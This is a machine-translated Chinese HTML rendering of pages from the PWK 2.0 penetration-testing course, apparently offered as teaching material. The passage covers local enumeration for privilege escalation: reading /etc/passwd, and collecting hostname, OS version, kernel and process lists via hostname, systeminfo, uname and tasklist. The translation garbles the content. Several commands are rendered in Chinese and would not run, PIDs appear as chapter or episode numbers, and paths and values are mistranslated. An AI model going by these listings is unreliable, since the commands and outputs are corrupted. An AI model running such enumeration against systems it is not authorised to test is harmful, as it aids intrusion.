<div style="position:absolute;top:86032;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 516 - 获取有关 Windows 用户的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示其他帐户，包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户。</font></font></nobr></div>
<div style="position:absolute;top:86094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要枚举基于 Linux 的系统上的用户，我们可以简单地读取 /etc/passwd 的内容</font></font></nobr></div>
<div style="position:absolute;top:86114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/passwd</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86166;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root:x:0:0:root:/root:/bin/bash</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">守护进程:x:1:1:守护进程:/usr/sbin:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bin:x:2:2:bin:/bin:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:86233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理：x：13：13：代理：/bin：/usr/sbin/nologin</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86250;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">备份:x:34:34:backup:/var/backups:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:86335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语音调度器:x:108:29:语音调度器,,,:/var/run/speech-dispatcher:/bin/false</font></font></nobr></div>
<div style="position:absolute;top:86352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</font></font></nobr></div>
<div style="position:absolute;top:86369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:86386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xrdp:x:114:120::/var/run/xrdp:/bin/false</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86403;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student:x:1000:1000:Student,PWK,,:/home/student:/bin/bash</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql:x:115:121:MySQL 服务器,,,:/不存在:/bin/false</font></font></nobr></div>
<div style="position:absolute;top:86439;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 517 - 获取有关 Linux 用户的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd 文件列出了几个用户帐户，包括网络上各种服务使用的帐户。</font></font></nobr></div>
<div style="position:absolute;top:86488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标机器，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，表示可能安装了 Web 服务器。</font></font></nobr></div>
<div style="position:absolute;top:86521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举目标机器上的所有用户有助于识别潜在的高权限用户帐户</font></font></nobr></div>
<div style="position:absolute;top:86540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以瞄准以提升我们的特权。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:86575;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.2 枚举主机名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常可以提供有关其功能角色的线索。</font><font style="vertical-align: inherit;">通常情况下，</font></font></nobr></div>
<div style="position:absolute;top:86629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名将包括可识别的缩写，例如 web 代表网络服务器，db 代表数据库</font></font></nobr></div>
<div style="position:absolute;top:86648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器，域控制器的 dc 等。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:86899;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="74"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 74 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:86932;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:88009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:88009;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:88009;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">515</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font><font style="font-size:8px"><font style="vertical-align: inherit;">aptly</font></font><font style="vertical-align: inherit;"> -named </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hostname</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 444,445</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">发现主机名，该</font><font style="vertical-align: inherit;">命令已安装</font></font></nobr></div>
<div style="position:absolute;top:87047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 和 Linux 上。</font></font></nobr></div>
<div style="position:absolute;top:87080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们先在 Windows 上运行它，</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87132;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端251</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87151;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 518 - 在 Windows 上获取有关主机名的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后在 Linux 上：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87232;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debian</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87252;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 519 - 在 Linux 上获取有关主机名的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 机器的相当通用的名称确实指向内部可能的命名约定</font></font></nobr></div>
<div style="position:absolute;top:87300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以帮助我们找到其他工作站的网络，而 Linux 客户端的主机名</font></font></nobr></div>
<div style="position:absolute;top:87320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们提供有关正在使用的操作系统 (Debian) 的信息。</font></font></nobr></div>
<div style="position:absolute;top:87353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定机器的作用可以帮助我们集中精力收集信息。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:87387;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.3 枚举操作系统版本和架构</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在期间特权升级过程中的一些问题，我们可能需要依靠</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">446次</font></font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那</font></font></nobr></div>
<div style="position:absolute;top:87441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专门利用目标操作系统核心中的漏洞。</font><font style="vertical-align: inherit;">这些类型的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:87460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是为特定类型的目标构建的，由特定的操作系统和版本指定</font></font></nobr></div>
<div style="position:absolute;top:87480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组合。</font><font style="vertical-align: inherit;">由于使用不匹配的内核漏洞攻击目标可能导致系统</font></font></nobr></div>
<div style="position:absolute;top:87499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不稳定（导致无法访问并可能提醒系统管理员），我们必须收集</font></font></nobr></div>
<div style="position:absolute;top:87518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标的精确信息。</font></font></nobr></div>
<div style="position:absolute;top:87551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 操作系统上，我们可以收集特定的操作系统和架构</font></font></nobr></div>
<div style="position:absolute;top:87571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着信息</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统的系统信息</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">447</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的效用。</font></font></nobr></div>
<div style="position:absolute;top:87603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">findstr</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 448</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和一些有用的标志来过滤输出。</font><font style="vertical-align: inherit;">具体来说，我们可以</font></font></nobr></div>
<div style="position:absolute;top:87623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将行首的模式与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/B</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配，</font><font style="vertical-align: inherit;">并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/C:</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定特定的搜索字符串</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:87656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的示例中，我们将使用这些标志来提取操作系统的名称 (Name) 作为</font></font></nobr></div>
<div style="position:absolute;top:87675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及它的版本（Version）和架构（System）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统信息 | </font><font style="vertical-align: inherit;">findstr /B /C:"操作系统名称" /C:"操作系统版本" /C:"系统类型"</font></font></font></b></nobr></div>
<div style="position:absolute;top:87727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统名称：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87727;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 10 专业版</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87744;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.0.16299 不适用 内部版本 16299</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统类型：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:87761;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 X86 的 PC</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87780;left:226"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 520 - 获取正在运行的操作系统的版本和架构</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:87879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">444 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname</font></font></font></nobr></div>
<div style="position:absolute;top:87899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（彼得·托比亚斯，2003 年），https://linux.die.net/man/1/hostname</font></font></font></nobr></div>
<div style="position:absolute;top:87919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">446 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Kernel_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(operating_system)</font></font></font></nobr></div>
<div style="position:absolute;top:87939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">447 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo</font></font></font></nobr></div>
<div style="position:absolute;top:87959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">448 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:88087;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="75"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 75 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:88120;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:89197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:89197;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:89197;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">516</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出表明目标系统正在运行 Windows 10 Pro 版本 10.0.16299</font></font></nobr></div>
<div style="position:absolute;top:88235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86 架构。</font></font></nobr></div>
<div style="position:absolute;top:88268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Linux 上，/etc/issue 和 /etc/*-release 文件包含类似的信息。</font><font style="vertical-align: inherit;">我们也可以发出</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:88288;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uname -a </font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">449</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/issue</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:88339;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debian GNU/Linux 9 </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\n \l</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/*-release</font></font></font></b></nobr></div>
<div style="position:absolute;top:88390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRETTY_NAME=" </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debian GNU/Linux 9 (stretch)</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "</font></font></nobr></div>
<div style="position:absolute;top:88407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NAME="Debian GNU/Linux"</font></font></nobr></div>
<div style="position:absolute;top:88424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VERSION_ID="9"</font></font></nobr></div>
<div style="position:absolute;top:88441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VERSION="9 (拉伸)"</font></font></nobr></div>
<div style="position:absolute;top:88458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID=debian</font></font></nobr></div>
<div style="position:absolute;top:88475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:88509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uname -a</font></font></font></b></nobr></div>
<div style="position:absolute;top:88526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux debian </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.9.0-6-686</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> GNU/Linux</font></font></nobr></div>
<div style="position:absolute;top:88545;left:226"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 521 - 获取正在运行的操作系统和架构的版本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc 目录中的文件包含操作系统版本 (Debian 9) 和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uname</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:88595;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出内核版本 (4.9.0-6) 和架构 (i686 / x86)。</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88628;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.4 枚举正在运行的进程和服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们来看看运行的进程和服务，这些进程和服务可以让我们提升我们的权限。</font></font></nobr></div>
<div style="position:absolute;top:88682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，该进程必须在特权帐户的上下文中运行，并且必须具有</font></font></nobr></div>
<div style="position:absolute;top:88702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的权限或允许我们以意想不到的方式与其交互。</font></font></nobr></div>
<div style="position:absolute;top:88735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tasklist</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 450</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">列出 Windows 上正在运行的进程</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ SVC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font></font></nobr></div>
<div style="position:absolute;top:88754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回映射到特定 Windows 服务的进程。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务列表 /SVC</font></font></font></b></nobr></div>
<div style="position:absolute;top:88823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图像名称    </font></font></nobr></div>
<div style="position:absolute;top:88823;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID服务</font></font></nobr></div>
<div style="position:absolute;top:88840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ============================</font></font></nobr></div>
<div style="position:absolute;top:88857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:88874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsass文件    </font></font></nobr></div>
<div style="position:absolute;top:88874;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">564 KeyIso、Netlogon、SamSs、VaultSvc</font></font></nobr></div>
<div style="position:absolute;top:88891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
<div style="position:absolute;top:88891;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">676 BrokerInfrastructure，DcomLaunch，LSM，</font></font></nobr></div>
<div style="position:absolute;top:88907;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即插即用、电源、SystemEventsBroker</font></font></nobr></div>
<div style="position:absolute;top:88924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字体驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:88924;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第684话</font></font></nobr></div>
<div style="position:absolute;top:88942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字体驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:88942;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第692话</font></font></nobr></div>
<div style="position:absolute;top:88959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
<div style="position:absolute;top:88959;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第776章</font></font></nobr></div>
<div style="position:absolute;top:88975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件    </font></font></nobr></div>
<div style="position:absolute;top:88975;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第856话</font></font></nobr></div>
<div style="position:absolute;top:88992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机程序    </font></font></nobr></div>
